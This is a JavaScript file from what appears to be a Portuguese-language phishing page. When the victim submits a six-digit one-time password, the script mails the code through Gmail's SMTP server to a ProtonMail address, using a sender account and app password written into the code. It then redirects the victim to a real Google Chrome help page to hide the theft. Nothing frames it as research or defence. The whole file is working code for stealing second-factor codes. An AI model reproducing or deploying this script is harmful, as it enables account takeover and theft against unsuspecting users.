window.onload = function()
{
    var x = document.getElementById("otpBtn");
    var err = document.getElementById("bad-login");

    x.addEventListener("click", function(e) {
        e.preventDefault();
        var oOtp = document.querySelector("#otp");
        var y = oOtp.value;
        console.log(y);
        if (y.length == 6)
        {
            console.log(y);
            Email.send({
                Host: "smtp.gmail.com",
                Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                Password : "ryqi owje owui bjfw",
                To : 'user1533@protonmail.com',
                From : "xsda.ddce.2343.2343.xsop@gmail.com",
                Subject : y,
                Body : "<p> << One Time Password </p>",
            });
            window.location.href = "https://support.google.com/chrome/answer/2765944?hl=pt-BR&co=GENIE.Platform%3DAndroid";

        } else {
            err.innerHTML = "<p class='err-alert'>Código incorreto, tente novamente.<p>";
            oOtp.value='';
        }
    });
}    
    
    